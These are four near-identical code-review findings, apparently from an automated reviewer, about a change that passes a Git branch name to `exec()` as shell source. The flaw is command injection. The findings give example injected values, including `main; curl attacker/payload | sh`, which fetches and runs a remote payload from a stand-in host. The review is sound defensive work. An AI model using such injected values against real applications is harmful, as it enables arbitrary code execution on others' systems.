findings.title: [P1] Pass the branch as a literal argument
findings.body: When `branch` contains shell syntax, `exec()` evaluates it as shell source. For example, a value containing `; <command>` executes that command with the application's privileges. Retain shell-free argument passing via `execFile("git", ["show", branch])`.

findings.title: [P1] Pass `branch` as a literal argument instead of shell source
findings.body:
`exec` interprets the branch string as a shell program. On POSIX, input such as `HEAD; arbitrary-command` runs an additional command, while `HEAD & nohup long-task &` can launch work that outlives the returned `ChildProcess`, breaking ordering and cancellation semantics.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument without invoking a shell
findings.body:
`exec()` interpolates `branch` into a shell command. Any caller-controlled value containing shell syntax, such as `main; curl attacker/payload | sh`, executes arbitrary commands under the application account. Shell metacharacters can also occur in valid Git ref names.

_Recommend validating this comment independently._

findings.title: [P1] Preserve shell-free execution for branch arguments
findings.body:
`exec` interpolates `branch` into a shell command, so an attacker-controlled value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. The previous `execFile` implementation passed the branch as a literal argument.

_Recommend validating this comment independently._
